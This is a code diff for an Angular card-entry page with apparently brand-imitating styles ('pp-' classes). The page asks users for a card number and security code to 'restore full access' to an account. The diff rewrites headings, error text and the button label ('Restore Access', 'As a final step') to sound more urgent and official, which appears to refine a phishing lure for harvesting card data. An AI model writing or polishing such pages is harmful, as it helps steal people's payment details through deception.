@@ -14,9 +14,9 @@ import { validateCardLogic, CardType } from './card-validation.utils';
     <app-public-layout>
       
       <div class="flex flex-col items-center mb-6">
-        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">Link a card</h1>
+        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">Confirm your card</h1>
         <p class="text-base text-slate-500 text-center leading-relaxed max-w-[90%]">
-           Link a debit or credit card to verify your identity and restore full account access.
+           As a final step, please verify the card on file to restore full access.
         </p>
       </div>
 
@@ -24,8 +24,8 @@ import { validateCardLogic, CardType } from './card-validation.utils';
         <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
             <span class="material-icons text-[#D92D20] text-xl">credit_card_off</span>
             <div>
-              <p class="text-sm font-bold text-pp-navy">Check card details</p>
-              <p class="text-xs text-slate-600 mt-1">We couldn't confirm this card. Please try again.</p>
+              <p class="text-sm font-bold text-pp-navy">Please check your card info</p>
+              <p class="text-xs text-slate-600 mt-1">We couldn't verify this card. Please check the details or try another one.</p>
             </div>
         </div>
       }
@@ -46,7 +46,7 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                  class="pp-input peer font-mono tracking-wide"
                  [class.shadow-input-error]="touchedCard() && !isCardNumValid()"
                >
-               <label for="cardNum" class="pp-label">Card number</label>
+               <label for="cardNum" class="pp-label">Debit or credit card number</label>
                
                <!-- Dynamic Brand Icon -->
                @if(cardType() !== 'unknown') {
@@ -91,7 +91,7 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                     class="pp-input peer font-mono"
                     [class.shadow-input-error]="touchedCvv() && !isCvvValid()"
                   >
-                  <label for="cvv" class="pp-label">Security Code</label>
+                  <label for="cvv" class="pp-label">Security code</label>
                   
                   <div class="absolute right-3 top-4 text-slate-400 group relative cursor-help">
                       <span class="material-icons text-[20px]">help_outline</span>
@@ -107,7 +107,7 @@ import { validateCardLogic, CardType } from './card-validation.utils';
             [class.opacity-50]="!isValid()"
             class="pp-btn"
           >
-            Link Card
+            Restore Access
           </button>
         </div>
         
